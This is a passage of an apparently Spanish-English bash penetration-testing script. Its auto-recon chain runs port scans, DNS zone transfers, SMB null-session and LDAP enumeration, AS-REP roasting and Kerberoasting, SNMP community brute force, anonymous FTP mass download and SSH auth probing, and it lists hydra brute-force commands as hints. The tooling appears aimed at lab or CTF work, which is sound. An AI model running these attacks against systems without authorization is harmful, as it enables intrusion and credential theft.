        log_info "Switch to it: ${WHITE}Ctrl-b n${NC}  (next window)  or  ${WHITE}Ctrl-b w${NC}  (window list)"
    else
        log_info "Attach with: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
    fi

    [[ -n "$out_hint" ]] && log_info "Live output: ${WHITE}[M] Live Monitor${NC}  →  tail -f $out_hint"
    echo ""
}

# =============================================================================
# -- UPGRADE 2: Smart OS Detection (TTL + SMB Deep Parse) ----------------------
# =============================================================================
detect_os() {
    local target_ip="${1:-$IP}"
    log_info "Detecting OS for $target_ip..."
    
    OS_TARGET="Unknown"
        OS_ICON="[?]"

    local ttl_raw
    ttl_raw=$(ping -c 1 -W 2 "$target_ip" 2>/dev/null | grep -oP 'ttl=\K[0-9]+' | head -1)

    if [[ -n "$ttl_raw" ]]; then
        log_info "Raw TTL value received: ${WHITE}$ttl_raw${NC}"
        if   (( ttl_raw <= 64 )); then
            OS_TARGET="Linux"
            OS_ICON="🐧"
        elif (( ttl_raw <= 128 )); then
            OS_TARGET="Windows"
            OS_ICON="🪟"
        elif (( ttl_raw <= 255 )); then
            OS_TARGET="Network/Cisco"
            OS_ICON="❓"
        fi
    else
        log_warn "No ping response from $target_ip - relying on deep scan data if available."
    fi

    # Refine with deep scan results if target is Windows or Unknown
    if [[ "$OS_TARGET" == "Windows" || "$OS_TARGET" == "Unknown" ]]; then
        # 1. Nmap SMB script output
        if [[ -f "$LOOT_DIR/smb/nmap_smb.txt" ]]; then
            local precise_os=$(grep -ioP 'OS:.*\KWindows.*' "$LOOT_DIR/smb/nmap_smb.txt" | cut -d ';' -f1 | head -n 1)
            [[ -n "$precise_os" ]] && OS_TARGET="$precise_os" && OS_ICON="🪟"
        fi
        
        # 2. NetExec output (Overrides Nmap if available, as it's often more accurate with AD roles)
        if [[ -f "$LOOT_DIR/smb/nxc_smb.txt" ]]; then
            local nxc_os=$(grep -ioP '\[\*\]\s+\KWindows.*?(?=\s+x64|\s+x86|\s+\(name)' "$LOOT_DIR/smb/nxc_smb.txt" | head -n 1)
            # Fallback if standard NXC output doesn't match the regex perfectly
            if [[ -z "$nxc_os" ]]; then
                nxc_os=$(grep -ioP 'Windows\s+(Server|10|11|7)[^(\n]*' "$LOOT_DIR/smb/nxc_smb.txt" | head -n 1)
            fi
            [[ -n "$nxc_os" ]] && OS_TARGET="$nxc_os" && OS_ICON="🪟"
        fi
    fi
    
    # Trim and Format
    OS_TARGET=$(echo "$OS_TARGET" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
    
    if [[ "$OS_TARGET" == *"Windows"* ]]; then
        log_ok "OS Detection: ${LCYAN}${BOLD}$OS_TARGET${NC} $OS_ICON"
    elif [[ "$OS_TARGET" == *"Linux"* ]]; then
        log_ok "OS Detection: ${LGREEN}${BOLD}$OS_TARGET${NC} $OS_ICON"
    else
        log_ok "OS Detection: ${YELLOW}${BOLD}$OS_TARGET${NC} $OS_ICON"
    fi
}

# =============================================================================
# -- SMART ENUM HELPERS --------------------------------------------------------
# =============================================================================
# Item 3: Robust status check — file must exist, be non-empty, and optionally
#          contain a completion string (e.g. "Nmap done") to confirm the scan
#          actually finished and didn't just crash producing a partial file.
scan_is_done() {
    local file="$1"
    local completion_string="${2:-}"
    # File must exist AND have size > 0
    [[ ! -s "$file" ]] && return 1
    # If a completion string is required, check it
    if [[ -n "$completion_string" ]]; then
        grep -q "$completion_string" "$file" 2>/dev/null || return 1
    fi
    return 0
}

# Item 2: Concurrency limiter — prevents launching more than N heavy scanners
#          simultaneously. Avoids DoS-ing the target or dropping packets.
MAX_CONCURRENT_SCANS=2
run_limited() {
    while [[ $(jobs -rp | wc -l) -ge $MAX_CONCURRENT_SCANS ]]; do
        wait -n 2>/dev/null   # Wait for any ONE job to finish
    done
    "$@" &
}

# =============================================================================
# -- UPGRADE 1: Auto-Recon (chained automation) --------------------------------
# =============================================================================
auto_recon() {
    if [[ -z "$IP" ]]; then
        log_warn "Target IP not configured."
        setup_config
        [[ -z "$IP" ]] && return
    fi
    require_loot || return
    banner
    log_section "AUTO-RECON — FULL CHAIN (20 steps)"

    echo -e "  ${WHITE}Auto-Recon will execute in optimized phases:${NC}"
    echo ""
    echo -e "  ${LCYAN}${BOLD}-- FASE 1: Descubrimiento --${NC}"
    echo -e "  ${GREEN} 1.${NC} TTL OS detection"
    echo -e "  ${GREEN} 2.${NC} Fast port scan (all 65535 TCP ports)"
    echo -e "  ${GREEN} 3.${NC} UDP top 100 scan"
    echo -e "  ${GREEN} 4.${NC} Automatic port extraction"
    echo -e "  ${GREEN} 5.${NC} Deep service scan (-sC -sV)"
    echo ""
    echo -e "  ${LCYAN}${BOLD}-- FASE 2: Entorno & Identidades (rapido, alto valor) --${NC}"
    echo -e "  ${GREEN} 6.${NC} DNS zone transfer + subdomain brute (if 53 open)"
    echo -e "  ${GREEN} 7.${NC} SMB + rpcclient + smbclient (if 445 open)"
    echo -e "  ${GREEN} 8.${NC} LDAP / Active Directory (if 389/636/88 open)"
    echo -e "  ${GREEN} 9.${NC} SNMP enum (if 161/udp open)"
    echo -e "  ${GREEN}10.${NC} SMTP user enum (if 25 open)"
    echo ""
    echo -e "  ${LCYAN}${BOLD}-- FASE 3: Servicios especificos (media intensidad) --${NC}"
    echo -e "  ${GREEN}11.${NC} FTP anon check + download (if 21 open)"
    echo -e "  ${GREEN}12.${NC} SSH audit + auth methods (if 22 open)"
    echo -e "  ${GREEN}13.${NC} NFS enum (if 2049 open)"
    echo -e "  ${GREEN}14.${NC} Database enum -> MySQL/MSSQL/Postgres/Redis"
    echo -e "  ${GREEN}15.${NC} IMAP/POP3 enum (if 143/110 open)"
    echo -e "  ${GREEN}16.${NC} RDP / WinRM (if 3389/5985 open)"
    echo -e "  ${GREEN}17.${NC} Banner grab para puertos desconocidos"
    echo ""
    echo -e "  ${LCYAN}${BOLD}-- FASE 4: Ataques pesados (alto ancho de banda) --${NC}"
    echo -e "  ${GREEN}18.${NC} Web enum -> DINAMICO: detecta TODOS los puertos HTTP"
    echo -e "  ${GREEN}19.${NC} Vuln scan (nmap --script vuln, background)"
    echo ""
    echo -e "  ${LCYAN}${BOLD}-- FASE 5: Cierre --${NC}"
    echo -e "  ${GREEN}20.${NC} Espera -> Parseo de hallazgos -> Searchsploit"
    echo ""
    echo -e "  ${YELLOW}[*]${NC} Web Enumeration Engine (Proteccion anti-saturacion):"
    echo -e "      1) Feroxbuster (Recomendado! Moderno, recursivo, preciso)"
    echo -e "      2) Gobuster    (Clasico, predecible)"
    echo -e "      3) Ambos       (Agresivo, genera doble trafico - riesgo proxy/WAF)"
    read -rp "  Selected Engine [1-3] (Default: 1): " -t 30 web_engine || web_engine=1
    case "$web_engine" in
        2) USE_FEROX=false; USE_GB=true ;;
        3) USE_FEROX=true;  USE_GB=true ;;
        *) USE_FEROX=true;  USE_GB=false ;;
    esac

    # -- Pre-flight tool check para Feroxbuster --
    if [[ "$USE_FEROX" == "true" ]] && ! command -v feroxbuster &>/dev/null; then
        echo ""
        log_warn "CRITICO: Feroxbuster no esta instalado o no es accesible (comprueba tu PATH)."
        log_info "Cambiando de emergencia a Gobuster (Clasico) para evitar fallos silenciosos en la Fase Web..."
        USE_FEROX=false
        USE_GB=true
        sleep 2
    fi

    echo ""
    read -rp "  $(echo -e "${YELLOW}[*]${NC} Proceed with full Auto-Recon? [Y/n]: ")" confirm
    [[ "$confirm" =~ ^[Nn]$ ]] && return

    # -- Step 1: OS detection & Connectivity Check ---------
    log_section "Step 1/20: OS Detection via TTL"
    step_start s01 "OS Detection"
    detect_os
    
    # Pre-Flight VPN Check
    if [[ "$OS_TARGET" == "Unknown" ]]; then
        echo ""
        log_warn "⚠️  CRÍTICO: La máquina $IP no responde a Ping."
        echo -e "  ${YELLOW}Posibles causas:${NC}"
        echo -e "  1. ❌ Te has olvidado de encender la VPN o se ha caído."
        echo -e "  2. ❌ La máquina víctima está apagada o reiniciando."
        echo -e "  3. 🛡️ La máquina bloquea los pings (ICMP dropped por firewall)."
        echo ""
        read -rp "  $(echo -e "${CYAN}¿Quieres FORZAR el escaneo asumiendo que bloquea pings? [y/N]:${NC} ")" force_scan
        if [[ ! "$force_scan" =~ ^[Yy]$ ]]; then
            log_error "Auto-Recon abortado. ¡Enciende la VPN y vuelve a intentarlo!"
            echo ""; read -rp "  Presiona ENTER para volver al menú..." ; return
        fi
        log_info "Forzando escaneo intensivo (parámetro -Pn)..."
    fi
    step_done s01
    sleep 0.5

    # -- Step 2: Fast TCP port scan (skipped if fresh results exist) ---------------------
    log_section "Step 2/20: Fast Port Scan (all 65535 TCP ports)"
    step_start s02 "Port Scan TCP"

    local fast_out="$LOOT_DIR/scans/allports.txt"

    if [[ -f "$fast_out" ]] && grep -qP '^[0-9]+/tcp\s+open' "$fast_out" 2>/dev/null; then
        log_ok "Found existing port scan ($fast_out) — skipping re-scan to save time."
    elif command -v rustscan &>/dev/null; then
        log_info "rustscan detected — using it for maximum speed."
        log_run "rustscan -a $IP --ulimit 5000 -- -sS -Pn -n -oN $fast_out"
        rustscan -a "$IP" --ulimit 5000 -- -sS -Pn -n -oN "$fast_out" 2>&1
    else
        log_info "rustscan not found — falling back to nmap --min-rate 5000."
        log_run "nmap -p- --open -sS --min-rate 5000 -n -Pn $IP -oN $fast_out"
        nmap -p- --open -sS --min-rate 5000 -n -Pn "$IP" -oN "$fast_out" 2>&1
    fi

    # -- Step 3: UDP top 100 scan ----------------------------------------------
    step_done s02
    log_section "Step 3/20: UDP Top 100 Port Scan"
    step_start s03 "UDP Scan"
    log_run "nmap -sU --top-ports 100 --min-rate 1000 -Pn $IP -oN $LOOT_DIR/scans/udp.txt"
    sudo nmap -sU --top-ports 100 --min-rate 1000 -Pn "$IP" -oN "$LOOT_DIR/scans/udp.txt" 2>&1

    PORTS_UDP=$(awk -F/ '/^[0-9]+\/udp[ \t]+open[ \t]+/ {print $1}' "$LOOT_DIR/scans/udp.txt" | paste -sd, -)
    if [[ -n "$PORTS_UDP" ]]; then
        echo "$PORTS_UDP" > "$LOOT_DIR/scans/open_ports_udp.txt"
        log_ok "UDP ports open: ${WHITE}$PORTS_UDP${NC}"
        add_finding "UDP abiertos (strict open): $PORTS_UDP"
    else
        log_warn "No UDP ports open (or ICMP filtered)."
    fi
    sleep 0.5

    # -- Step 4: Port extraction -----------------------------------------------
    step_done s03
    log_section "Step 4/20: Extracting Open TCP Ports"
    step_start s04 "Extract Ports"

    # 1. Standard Nmap Format (works for both Nmap and Rustscan nmap-layer)
    PORTS=$(awk -F/ '/^[0-9]+\/tcp[ \t]+open[ \t]+/ {print $1}' "$fast_out" | sort -un | paste -sd, -)
    
    # 2. Rustscan raw fallback (in case Nmap fails to execute via Rustscan)
    if [[ -z "$PORTS" ]]; then
        PORTS=$(grep -i "Open " "$fast_out" 2>/dev/null | grep -oP ':\K\d+' | sort -un | paste -sd, -)
    fi

    if [[ -z "$PORTS" ]]; then
        log_error "No open TCP ports detected. Auto-Recon aborted."
        echo ""; read -rp "  Press ENTER to continue..." ; return
    fi

    echo "$PORTS" > "$LOOT_DIR/scans/open_ports.txt"
    log_ok "Open TCP ports: ${WHITE}$PORTS${NC}"
    sleep 0.5

    # -- Step 5: Deep scan (foreground -> we need results to decide next steps) --
    step_done s04
    log_section "Step 5/20: Deep Service + Script Scan"
    step_start s05 "Deep Scan"

    local deep_out="$LOOT_DIR/scans/targeted"
    log_run "sudo nmap -p$PORTS -sC -sV -O --script-timeout 30s -Pn $IP -oA $deep_out"
    sudo nmap -p"$PORTS" -sC -sV -O --script-timeout 30s -Pn "$IP" -oA "$deep_out" 2>&1 | tee "${deep_out}.nmap"
    log_ok "Deep scan complete → ${WHITE}${deep_out}.nmap${NC}"

    # Parse service versions for the intelligence dashboard
    parse_service_versions "${deep_out}.nmap"
    # Auto-parse findings from deep scan
    parse_scan_findings "${deep_out}.nmap" "Deep Scan"

    # -- Display port/version summary table ---------------------------------
    echo ""
    echo -e "  ${LBLUE}${BOLD}+--------------------------------------------------------------+${NC}"
    echo -e "  ${LBLUE}${BOLD}║  📋 RESUMEN DE SERVICIOS DETECTADOS                         ║${NC}"
    echo -e "  ${LBLUE}${BOLD}?--------------------------------------------------------------?${NC}"
    if [[ ${#SERVICES_VERSION[@]} -gt 0 ]]; then
        for svc_entry in "${SERVICES_VERSION[@]}"; do
            local _s_port _s_svc _s_ver
            _s_port=$(echo "$svc_entry" | cut -d: -f1)
            _s_svc=$(echo "$svc_entry" | cut -d: -f2)
            _s_ver=$(echo "$svc_entry" | cut -d: -f3-)
            printf "  ${LBLUE}║${NC}  ${WHITE}%-6s${NC} ${GREEN}%-10s${NC} ${CYAN}%-40s${NC} ${LBLUE}║${NC}\n" "$_s_port" "$_s_svc" "$_s_ver"
        done
    else
        echo -e "  ${LBLUE}║${NC}  ${YELLOW}No se pudieron parsear versiones del deep scan${NC}         ${LBLUE}║${NC}"
    fi
    echo -e "  ${LBLUE}${BOLD}+--------------------------------------------------------------+${NC}"
    echo ""
    step_done s05
    sleep 0.5

    # --------------------------------------------------------------------------
    # -- FASE 2: Entorno & Identidades (r?pido, silencioso, alto valor) -------
    # --------------------------------------------------------------------------

    # -- Step 6: DNS zone transfer if 53 open ----------------------------------
    if has_port 53; then
        add_finding "💡 HACK: DNS zone transfer manual → dig axfr @$IP <domain>"
        log_section "Step 6/20: DNS Enumeration (Zone Transfer)"
        step_start s06 "DNS Enum"
        mkdir -p "$LOOT_DIR/dns"
        if [[ -n "$DOMAIN" ]]; then
            log_info "Intentando zone transfer en dominio: $DOMAIN"
            log_run "dig axfr $DOMAIN @$IP"
            dig axfr "$DOMAIN" @"$IP" 2>&1 | tee "$LOOT_DIR/dns/zone_transfer.txt"
            if grep -q "XFR size" "$LOOT_DIR/dns/zone_transfer.txt" 2>/dev/null; then
                add_finding "🚨 DNS ZONE TRANSFER EXITOSO — dominio completo expuesto"
                log_ok "${LRED}¡Zone transfer exitoso! Revisa $LOOT_DIR/dns/zone_transfer.txt${NC}"
            else
                log_info "Zone transfer denegado (normal)."
            fi
            log_run "host -l $DOMAIN $IP"
            host -l "$DOMAIN" "$IP" 2>&1 | tee "$LOOT_DIR/dns/host_transfer.txt"
            # Subdomain brute-force (runs in background — zone transfer rarely works)
            local _dns_wl="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
            [[ ! -f "$_dns_wl" ]] && _dns_wl="/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
            if command -v gobuster &>/dev/null && [[ -f "$_dns_wl" ]]; then
                log_info "🔍 Subdomain brute-force → gobuster dns..."
                tmux_run "DNSBrute" \
                    "gobuster dns -d $DOMAIN -w '$_dns_wl' -t 20 -o $LOOT_DIR/dns/subdomains.txt 2>&1" \
                    "$LOOT_DIR/dns/subdomains.txt"
            fi
        else
            log_warn "No hay DOMAIN configurado. Probando reverse DNS..."
            log_run "nmap -p53 --script dns-nsid,dns-recursion -Pn $IP"
            nmap -p53 --script dns-nsid,dns-recursion -Pn "$IP" -oN "$LOOT_DIR/dns/dns_nmap.txt" 2>&1
        fi
        add_finding "💡 HACK: DNS recon manual → dnsrecon -d $DOMAIN -a"
        step_done s06
    else
        log_section "Step 6/20: DNS Enumeration"
        step_skip s06 "DNS" "puerto 53 cerrado"
        log_warn "Port 53 not detected -> skipping DNS enum."
    fi

    # -- Step 7: SMB + rpcclient + smbclient ----------------------------------
    if echo "$PORTS" | grep -qw "445"; then
        if [[ -n "$USER_CRED" && -n "$PASS_CRED" ]]; then
            add_finding "💡 HACK: Ver shares (Auth) → smbclient -L //$IP -U \"$USER_CRED%$PASS_CRED\""
            add_finding "💡 HACK: Entrar a share → smbclient //$IP/SHARE_NAME -U \"$USER_CRED%$PASS_CRED\""
            add_finding "💡 HACK: Bajar todo recursivo → smbclient //$IP/SHARE_NAME -U \"$USER_CRED%$PASS_CRED\" -c 'prompt OFF; recurse ON; mget *'"
        else
            add_finding "💡 HACK: Ver shares (Anon) → smbclient -L //$IP -N"
            add_finding "💡 HACK: Entrar a share (Anon) → smbclient //$IP/SHARE_NAME -N"
            add_finding "💡 HACK: Bajar todo recursivo → smbclient //$IP/SHARE_NAME -N -c 'prompt OFF; recurse ON; mget *'"
        fi
        add_finding "💡 HACK: SMB Brute force -> $NXC smb $IP -u users.txt -p passwords.txt"
        log_section "Step 7/20: SMB Enumeration (background tmux)"
        step_start s07 "SMB Enum (bg)"
        tmux_run "SMBEnum" \
            "mkdir -p $LOOT_DIR/smb; touch $LOOT_DIR/smb/nmap_smb.txt; \
             echo '[*] Nmap SMB scripts...'; nmap -p445,139 --script 'smb-vuln*,smb-enum-shares,smb-enum-users,smb-os-discovery,smb2-security-mode,smb-protocols' -Pn $IP -oN $LOOT_DIR/smb/nmap_smb.txt; \
             echo '[*] enum4linux...'; if command -v enum4linux-ng >/dev/null 2>&1; then enum4linux-ng -A $IP 2>&1 | tee $LOOT_DIR/smb/enum4linux.txt; elif command -v enum4linux >/dev/null 2>&1; then enum4linux -a $IP 2>&1 | tee $LOOT_DIR/smb/enum4linux.txt; else echo 'enum4linux not found' > $LOOT_DIR/smb/enum4linux.txt; fi; \
             echo '[*] smbmap (null session)...'; smbmap -H $IP -u '' -p '' --no-banner 2>&1 | tee $LOOT_DIR/smb/smbmap.txt; \
             echo '[*] smbmap recursive null...'; smbmap -H $IP -u '' -p '' -r 2>&1 | tee $LOOT_DIR/smb/smbmap_null_recursive.txt; \
             echo '[*] smbmap recursive guest...'; smbmap -H $IP -u 'guest' -p '' -r 2>&1 | tee $LOOT_DIR/smb/smbmap_guest_recursive.txt; \
             echo '[*] smbclient null session...'; smbclient -L //$IP -N 2>&1 | tee $LOOT_DIR/smb/smbclient.txt; \
             echo '[*] rpcclient null session...'; rpcclient -U '' -N $IP -c 'enumdomusers; enumdomgroups; querydispinfo' 2>&1 | tee $LOOT_DIR/smb/rpcclient.txt; \
             echo '[*] Auto-crawl de shares -> smb_spider.sh...'; \
             if [ -f $LOOT_DIR/smb/smbmap.txt ] && [ -f ./smb_spider.sh ]; then \
                 bash ./smb_spider.sh $IP $LOOT_DIR/smb 2>&1 | tee $LOOT_DIR/smb/spider_log.txt; \
             fi; \
             echo '[+] SMB Enum completado.'" \
            "$LOOT_DIR/smb/nmap_smb.txt"
        # NXC si disponible -> null + guest sessions
        if command -v $NXC &>/dev/null; then
            tmux_run "NXC-SMB" \
                "echo '[*] NXC SMB null sessions...'; \
                 $NXC smb $IP --shares -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_shares.txt; \
                 $NXC smb $IP --users -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_users.txt; \
                 $NXC smb $IP --pass-pol -u '' -p '' 2>&1 | tee $LOOT_DIR/smb/nxc_passpol.txt; \
                 echo '[*] NXC SMB guest sessions...'; \
                 $NXC smb $IP --shares -u 'guest' -p '' 2>&1 | tee -a $LOOT_DIR/smb/nxc_shares.txt; \
                 $NXC smb $IP --users -u 'guest' -p '' 2>&1 | tee -a $LOOT_DIR/smb/nxc_users.txt; \
                 echo '[+] NXC SMB enum completado.'" \
                "$LOOT_DIR/smb/nxc_shares.txt"
        fi
        # -- Si hay credenciales -> enumeracion autenticada adicional -----------
        if [[ -n "$USER_CRED" && -n "$PASS_CRED" ]]; then
            log_info "Credenciales detectadas ($USER_CRED) → lanzando SMB autenticado..."
            tmux_run "NXC-Auth" \
                "echo '[*] NXC autenticado con $USER_CRED...'; \
                 $NXC smb $IP -u '$USER_CRED' -p '$PASS_CRED' --shares 2>&1 | tee $LOOT_DIR/smb/nxc_auth_shares.txt; \
                 $NXC smb $IP -u '$USER_CRED' -p '$PASS_CRED' --users  2>&1 | tee $LOOT_DIR/smb/nxc_auth_users.txt; \
                 $NXC smb $IP -u '$USER_CRED' -p '$PASS_CRED' --groups 2>&1 | tee $LOOT_DIR/smb/nxc_auth_groups.txt; \
                 $NXC smb $IP -u '$USER_CRED' -p '$PASS_CRED' --loggedon-users 2>&1 | tee $LOOT_DIR/smb/nxc_auth_loggedon.txt; \
                 echo '[*] smbmap autenticado...'; \
                 smbmap -H $IP -u '$USER_CRED' -p '$PASS_CRED' 2>&1 | tee $LOOT_DIR/smb/smbmap_auth.txt; \
                 echo '[*] enum4linux-ng autenticado...'; \
                 enum4linux-ng -A $IP -u '$USER_CRED' -p '$PASS_CRED' 2>&1 | tee $LOOT_DIR/smb/enum4linux_auth.txt; \
                 echo '[+] SMB autenticado completado.'" \
                "$LOOT_DIR/smb/nxc_auth_shares.txt"
        fi
    else
        log_section "Step 7/20: SMB Enumeration"
        step_skip s07 "SMB" "puerto 445 cerrado"
        log_warn "Port 445 not detected — skipping SMB enum."
    fi

    # -- Step 8: LDAP / Active Directory enum if 389/636/88 open ------------
    if has_any_port 389 636 88; then
        log_section "Step 8/20: LDAP / Active Directory Enumeration"
        step_start s08 "LDAP/AD Enum (bg)"
        mkdir -p "$LOOT_DIR/ldap"
        tmux_run "LDAPEnum" \
            "echo '[*] ldapsearch base...'; ldapsearch -x -H ldap://$IP -b '' -s base namingcontexts 2>&1 | tee $LOOT_DIR/ldap/ldapsearch_base.txt; \
             echo '[*] ldapsearch full...'; ldapsearch -x -H ldap://$IP -b \"$(grep -oP 'DC=\S+' $LOOT_DIR/ldap/ldapsearch_base.txt 2>/dev/null | head -1)\" 2>&1 | tee $LOOT_DIR/ldap/ldapsearch.txt; \
             echo '[*] Nmap LDAP scripts...'; nmap -p389,636 --script ldap-search,ldap-rootdse -Pn $IP -oN $LOOT_DIR/ldap/ldap_nmap.txt" \
            "$LOOT_DIR/ldap/ldapsearch.txt"
        log_ok "LDAP enum launched in background."
        # AS-REP Roasting si Kerberos (88) abierto e impacket disponible
        if has_port 88 && command -v impacket-GetNPUsers &>/dev/null && [[ -n "$DOMAIN" ]]; then
            log_info "🎯 Kerberos + LDAP → Lanzando AS-REP Roasting + Kerberoasting..."
            tmux_run "ASREProast" \
                "echo '[*] Esperando LDAP para extraer usuarios (15s)...'; sleep 15; \
                 grep -oP '(?<=sAMAccountName: ).*' $LOOT_DIR/ldap/ldapsearch.txt 2>/dev/null | sort -u > $LOOT_DIR/ldap/ldap_users.txt; \
                 echo '[*] AS-REP Roasting...'; \
                 impacket-GetNPUsers '$DOMAIN/' -dc-ip $IP -no-pass -usersfile $LOOT_DIR/ldap/ldap_users.txt 2>&1 | tee $LOOT_DIR/ldap/asrep_hashes.txt; \
                 echo '[*] Kerberoasting (GetUserSPNs)...'; \
                 impacket-GetUserSPNs '$DOMAIN/' -dc-ip $IP -no-pass -usersfile $LOOT_DIR/ldap/ldap_users.txt -outputfile $LOOT_DIR/ldap/kerberoast_hashes.txt 2>&1 | tee -a $LOOT_DIR/ldap/kerberoast_output.txt; \
                 echo '[+] AS-REP + Kerberoasting completado.'" \
                "$LOOT_DIR/ldap/asrep_hashes.txt"
        fi
    else
        log_section "Step 8/20: LDAP / AD"
        step_skip s08 "LDAP/AD" "389/636/88 cerrado"
        log_warn "LDAP ports (389/636/88) not detected — skipping."
    fi

    # -- Step 9: SNMP enum if 161/udp open ------------------------------------
    if [[ -n "$PORTS_UDP" ]] && echo ",$PORTS_UDP," | grep -q ",161,"; then
        add_finding "💡 HACK: SNMP interactivo → snmpwalk -v2c -c public $IP"
        log_section "Step 9/20: SNMP Enumeration (background tmux)"
        step_start s09 "SNMP Enum (bg)"
        local snmp_wl="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt"
        [[ ! -f "$snmp_wl" ]] && snmp_wl="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
        tmux_run "SNMPEnum" \
            "echo '[*] Community brute...'; onesixtyone -c $snmp_wl $IP | tee $LOOT_DIR/scans/snmp_communities.txt; \
             echo '[*] snmpwalk FULL (public)...'; snmpwalk -v2c -c public $IP | tee $LOOT_DIR/scans/snmpwalk.txt; \
             echo '[*] snmpwalk PROCESOS (creds en command line)...'; snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2 | tee $LOOT_DIR/scans/snmp_processes.txt; \
             echo '[*] snmpwalk SOFTWARE instalado...'; snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2 | tee $LOOT_DIR/scans/snmp_software.txt; \
             echo '[*] snmpwalk USUARIOS Windows...'; snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25 | tee $LOOT_DIR/scans/snmp_users.txt; \
             echo '[*] snmp-check...'; snmp-check $IP | tee $LOOT_DIR/scans/snmpcheck.txt" \
            "$LOOT_DIR/scans/snmpwalk.txt"
    else
        log_section "Step 9/20: SNMP Enumeration"
        step_skip s09 "SNMP" "161/udp cerrado"
        log_warn "SNMP (161/udp) not detected — skipping."
    fi

    # -- Step 10: SMTP enum if port 25 open -----------------------------------
    if has_port 25; then
        log_section "Step 10/20: SMTP Enumeration"
        step_start s10 "SMTP Enum (bg)"
        mkdir -p "$LOOT_DIR/smtp"
        tmux_run "SMTPEnum" \
            "echo '[*] SMTP Nmap...'; nmap -p25 --script smtp-commands,smtp-enum-users,smtp-vuln* $IP -oN $LOOT_DIR/smtp/smtp_nmap.txt; \
             echo '[*] SMTP VRFY...'; smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP 2>&1 | tee $LOOT_DIR/smtp/smtp_vrfy.txt" \
            "$LOOT_DIR/smtp/smtp_nmap.txt"
        log_ok "SMTP enum launched in background."
        add_finding "💡 HACK: SMTP relay → swaks --to root --from test@test.com --server $IP"
        add_finding "💡 HACK: SMTP user enum → smtp-user-enum -M RCPT -U users.txt -t $IP"
    else
        log_section "Step 10/20: SMTP"
        step_skip s10 "SMTP" "puerto 25 cerrado"
        log_warn "Port 25 not detected — skipping."
    fi

    # --------------------------------------------------------------------------
    # -- FASE 3: Servicios espec?ficos (media intensidad) ---------------------
    # --------------------------------------------------------------------------

    # -- Step 11: FTP anon check + download -------------------------------------
    if has_port 21; then
        log_section "Step 11/20: FTP Anonymous Check + Download"
        step_start s11 "FTP Enum"
        mkdir -p "$LOOT_DIR/ftp"
        log_info "Testing FTP anonymous login..."
        local ftp_result
        ftp_result=$(timeout 10 bash -c "echo -e 'user anonymous anonymous\nls -la\npwd\nquit' | ftp -nv $IP 21" 2>&1)
        echo "$ftp_result" > "$LOOT_DIR/ftp/ftp_anon_test.txt"
        if echo "$ftp_result" | grep -qiE '230|logged in|successful'; then
            add_finding "🔓 FTP Anonymous login PERMITIDO"
            add_finding "💡 HACK: FTP descargar todo → wget -m ftp://anonymous:anonymous@$IP"
            add_finding "💡 HACK: FTP Brute force → hydra -l admin -P rockyou.txt ftp://$IP"
            log_ok "${LRED}FTP Anonymous login: PERMITIDO${NC}"
            log_info "Descargando todos los archivos del FTP (wget -m)..."
            tmux_run "FTPDownload" \
                "cd $LOOT_DIR/ftp && wget -m --no-passive ftp://anonymous:anonymous@$IP/ 2>&1 | tee ftp_download.log" \
                "$LOOT_DIR/ftp/ftp_download.log"
        else
            log_info "FTP anonymous login: denegado."
        fi
        step_done s11
    else
        log_section "Step 11/20: FTP Enumeration"
        step_skip s11 "FTP" "puerto 21 cerrado"
        log_warn "Port 21 not detected — skipping FTP."
    fi

    # -- Step 12: SSH audit + auth methods --------------------------------------
    if has_port 22; then
        log_section "Step 12/20: SSH Audit + Auth Methods"
        step_start s12 "SSH Enum"
        if command -v ssh-audit &>/dev/null; then
            log_run "ssh-audit $IP"
            ssh-audit "$IP" 2>&1 | tee "$LOOT_DIR/scans/ssh_audit.txt"
            if grep -qiE 'CVE-' "$LOOT_DIR/scans/ssh_audit.txt" 2>/dev/null; then
                local ssh_cves
                ssh_cves=$(grep -oP 'CVE-\d+-\d+' "$LOOT_DIR/scans/ssh_audit.txt" 2>/dev/null | sort -u | head -3 | tr '\n' ' ')
                [[ -n "$ssh_cves" ]] && add_finding "🔐 SSH CVEs: $ssh_cves"
            fi
            add_finding "💡 HACK: SSH Brute force → hydra -L users.txt -p password ssh://$IP"
        else
            log_warn "ssh-audit not installed (pip3 install ssh-audit)"
        fi
        log_info "Probando auth methods para múltiples usuarios..."
        for _ssh_user in root admin user www-data; do
            nmap -p22 --script ssh-auth-methods --script-args="ssh.user=$_ssh_user" -Pn "$IP" \
                -oN "$LOOT_DIR/scans/ssh_auth_${_ssh_user}.txt" 2>&1
            if grep -qi "password" "$LOOT_DIR/scans/ssh_auth_${_ssh_user}.txt" 2>/dev/null; then
                add_finding "🔑 SSH acepta password auth para user: $_ssh_user"
            fi
        done
        cat "$LOOT_DIR"/scans/ssh_auth_*.txt > "$LOOT_DIR/scans/ssh_auth_methods.txt" 2>/dev/null
        step_done s12
    else
        log_section "Step 12/20: SSH Audit"
        step_skip s12 "SSH" "puerto 22 cerrado"
        log_warn "Port 22 not detected — skipping."
    fi

    # -- Step 13: NFS enum if 2049 open ----------------------------------------
    if echo "$PORTS" | grep -qw "2049"; then
        log_section "Step 13/20: NFS Enumeration"
        step_start s13 "NFS Enum"
        showmount -e "$IP" 2>&1 | tee "$LOOT_DIR/scans/nfs_shares.txt"
        if grep -qP '^\/' "$LOOT_DIR/scans/nfs_shares.txt" 2>/dev/null; then
            add_finding "🔓 NFS shares exportadas detectadas"
            add_finding "💡 HACK: Montar NFS manual → mount -t nfs $IP:/share /mnt"
            # Auto-mount y listar contenido de cada share
            local _nfs_mount_dir="/tmp/nfs_mount_$$"
            while IFS= read -r _nfs_line; do
                local _share_path
                _share_path=$(echo "$_nfs_line" | awk '{print $1}')
                if [[ -n "$_share_path" && "$_share_path" == /* ]]; then
                    log_info "Montando NFS share: ${WHITE}$IP:$_share_path${NC}"
                    mkdir -p "$_nfs_mount_dir"
